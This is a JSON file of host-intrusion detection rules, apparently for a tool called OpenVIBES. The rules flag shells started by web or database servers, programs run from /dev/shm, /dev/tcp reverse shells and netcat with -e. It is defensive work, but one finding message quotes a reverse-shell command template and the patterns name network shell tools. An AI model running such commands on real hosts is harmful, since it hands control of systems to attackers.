{"schema_version":1,"rules":[
{"id":"alarm.web_server.shell","version":1,"title":"A web server started a shell","severity":"high","confidence":70,"kind":"process_event","programs":["sh","dash","bash","zsh","ksh","ash","busybox"],"expression":"(event['process.name'] == 'sh' || event['process.name'] == 'dash' || event['process.name'] == 'bash' || event['process.name'] == 'zsh' || event['process.name'] == 'ksh' || event['process.name'] == 'ash' || event['process.name'] == 'busybox') && ((event['parent.name'] == 'nginx' || event['parent.name'] == 'httpd' || event['parent.name'] == 'apache2' || event['parent.name'] == 'lighttpd' || event['parent.name'] == 'caddy') || event['parent.name'].startsWith('php-fpm'))","finding_message":"A web server process started a shell. That is how web shells and command injection usually look; legitimate CGI scripts are the common exception. Check the command line and the request that caused it.","attack":[{"tactic":"TA0003","technique":"T1505.003"},{"tactic":"TA0002","technique":"T1059.004"}],"explain":"A web server (nginx, Apache, lighttpd, Caddy or PHP-FPM) started a shell. Web servers serve files and pass requests to applications; they rarely need a shell. When one does, an attacker is often running commands through a web shell or a command injection flaw. Shell-based CGI scripts are the usual harmless cause.","check":"Read the shell's command line. Find the web request that caused it in the access log at that time, and the script it reached. Look for new or changed files in the web root. If it is a known CGI script, suppress the alarm for that host or program."},
{"id":"alarm.database.shell","version":1,"title":"A database server started a shell","severity":"high","confidence":75,"kind":"process_event","programs":["sh","dash","bash","zsh","ksh","ash","busybox"],"expression":"(event['process.name'] == 'sh' || event['process.name'] == 'dash' || event['process.name'] == 'bash' || event['process.name'] == 'zsh' || event['process.name'] == 'ksh' || event['process.name'] == 'ash' || event['process.name'] == 'busybox') && (event['parent.name'] == 'mysqld' || event['parent.name'] == 'mariadbd' || event['parent.name'] == 'redis-server' || event['parent.name'] == 'mongod')","finding_message":"A database server process started a shell. These servers do not normally run shell commands; it is a common sign of an abused feature (a Redis module or config write, a MySQL UDF). Check the command line.","attack":[{"tactic":"TA0002","technique":"T1059.004"},{"tactic":"TA0001","technique":"T1190"}],"explain":"A database server (MySQL, MariaDB, Redis or MongoDB) started a shell. These servers do not run shell commands in normal work. It usually means a feature was abused to run code, such as a Redis config or module write or a MySQL user-defined function.","check":"Read the shell's command line. Check who could reach the database at that time and whether it accepts connections from outside the host. Look for new modules, user-defined functions, cron entries or SSH keys written by the database's user."},
{"id":"alarm.exec.dev_shm","version":1,"title":"A program ran from /dev/shm","severity":"high","confidence":80,"kind":"process_event","expression":"event['process.exe'].startsWith('/dev/shm/')","finding_message":"A program was executed from /dev/shm, a memory-backed directory anyone can write to. Software is not installed there; dropped payloads often are. Check the file and who started it.","attack":[{"tactic":"TA0005","technique":"T1564"},{"tactic":"TA0002","technique":"T1059.004"}],"explain":"A program ran from /dev/shm, a memory-backed folder every user can write to. Software is not installed there, but attackers often drop and run payloads there because the files vanish on reboot.","check":"Look at the file, its owner and when it appeared, and copy it before the host restarts. Check which process started it and what that parent did before. Look for network connections the program opened."},
{"id":"alarm.shell.dev_tcp","version":1,"title":"A shell opened a network connection with /dev/tcp","severity":"critical","confidence":85,"kind":"process_event","programs":["sh","dash","bash","zsh","ksh"],"expression":"event['process.cmdline'].contains('/dev/tcp/') || event['process.cmdline'].contains('/dev/udp/')","finding_message":"A shell command line uses /dev/tcp or /dev/udp, the usual form of a reverse shell (for example bash -i >& /dev/tcp/HOST/PORT 0>&1). Check the command line and the connection's address.","attack":[{"tactic":"TA0002","technique":"T1059.004"},{"tactic":"TA0011","technique":"T1095"}],"explain":"A shell command line used /dev/tcp or /dev/udp. Shells such as bash treat these paths as network connections, and the usual reason to use them is a reverse shell that hands control of the host to a remote address.","check":"Read the command line for the remote address and port. Check whether the connection was made and is still open, which process started the shell, and how the attacker got that far. Treat the host as compromised until you know otherwise."},
{"id":"alarm.netcat.exec","version":1,"title":"Netcat was started with a program to run","severity":"critical","confidence":80,"kind":"process_event","programs":["nc","ncat","netcat","nc.openbsd","nc.traditional"],"expression":"(event['process.name'] == 'nc' || event['process.name'] == 'ncat' || event['process.name'] == 'netcat' || event['process.name'] == 'nc.openbsd' || event['process.name'] == 'nc.traditional') && (event['process.cmdline'].contains(' -e') || event['process.cmdline'].contains(' --exec ') || event['process.cmdline'].contains(' --sh-exec '))","finding_message":"Netcat was started with -e, --exec or --sh-exec, which connects a program (usually a shell) to the network: a classic bind or reverse shell. Check the command line and the address.","attack":[{"tactic":"TA0011","technique":"T1095"},{"tactic":"TA0002","technique":"T1059"}],"explain":"Netcat was started with -e, --exec or --sh-exec. These options connect a program, usually a shell, to a network connection: a classic bind or reverse shell. Administrators rarely need them.","check":"Read the command line for the program and the address or port. Check whether the connection was made, which process or user started netcat, and whether anything else ran from that session."},
{"id":"alarm.openvibes.test","version":1,"title":"OpenVIBES test alarm","severity":"info","confidence":100,"kind":"process_event","programs":["openvibes-test"],"expression":"event['process.name'] == 'openvibes-test'","finding_message":"The OpenVIBES test program (openvibes-test alarm) ran; alarms work on this host.","explain":"The OpenVIBES test program ran (for example `openvibes-test alarm`). Any run of it raises this alarm. It is harmless and exists to show that alarms reach the console from this host.","check":"Nothing to fix. If nobody on the team ran the test, ask who did."}
]}
